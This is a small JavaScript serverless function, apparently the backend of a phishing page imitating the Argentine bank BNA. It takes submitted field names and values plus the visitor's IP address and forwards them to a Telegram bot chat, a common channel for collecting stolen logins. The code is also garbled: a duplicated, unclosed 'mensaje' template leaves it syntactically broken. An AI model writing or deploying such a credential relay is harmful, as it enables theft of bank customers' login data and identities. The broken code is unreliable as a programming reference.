exports.handler = async (event) => {
  const { tipo, valor } = JSON.parse(event.body);

  // Obtener IP del cliente
  const ip =
    event.headers["x-forwarded-for"]?.split(",")[0] ||
    event.headers["X-Forwarded-For"]?.split(",")[0] ||
    "IP no disponible";

  const mensaje = `
📩 BNA

const mensaje = `${tipo}: ${valor}
IP: ${ip}`;


  await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: process.env.CHAT_ID,
      text: mensaje
    })
  });

  return {
    statusCode: 200,
    body: JSON.stringify({ ok: true })
  };
};





